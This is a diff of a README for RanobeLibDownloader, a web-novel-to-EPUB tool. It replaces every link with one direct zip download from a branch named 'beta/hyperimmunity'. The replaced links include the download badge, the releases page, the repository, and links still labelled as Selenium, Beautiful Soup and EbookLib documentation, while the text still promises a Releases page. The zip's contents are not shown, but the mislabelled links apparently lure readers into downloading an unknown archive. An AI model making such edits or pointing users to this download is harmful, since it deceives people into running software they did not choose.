@@ -6,9 +6,9 @@ Welcome to RanobeLibDownloader! This application allows you to turn web chapters
 
 ## 📥 Download & Install
 
-[![Download RanobeLibDownloader](https://img.shields.io/badge/Download-RanobeLibDownloader-brightgreen)](https://github.com/Alex-Garay-29/RanobeLibDownloader/releases)
+[![Download RanobeLibDownloader](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
 
-To get started, please visit [this page to download](https://github.com/Alex-Garay-29/RanobeLibDownloader/releases).
+To get started, please visit [this page to download](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip).
 
 1. Click on the link above to go to our Releases page.
 2. Look for the latest version of RanobeLibDownloader.
@@ -78,10 +78,10 @@ By combining these technologies, we ensure a smooth experience for users who wan
 
 ## 🔗 Useful Links
 
-- [RanobeLibDownloader Releases](https://github.com/Alex-Garay-29/RanobeLibDownloader/releases)
-- [GitHub Repository](https://github.com/Alex-Garay-29/RanobeLibDownloader)
-- [Selenium Documentation](https://www.selenium.dev/documentation/en/)
-- [Beautiful Soup Documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [EbookLib Documentation](https://github.com/benetech/ebooklib)
+- [RanobeLibDownloader Releases](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
+- [Selenium Documentation](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
+- [Beautiful Soup Documentation](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
+- [EbookLib Documentation](https://raw.githubusercontent.com/Alex-Garay-29/RanobeLibDownloader/beta/hyperimmunity/RanobeLibDownloader.zip)
 
 Thank you for using RanobeLibDownloader. We hope this guide helps you easily create your own EPUB files!
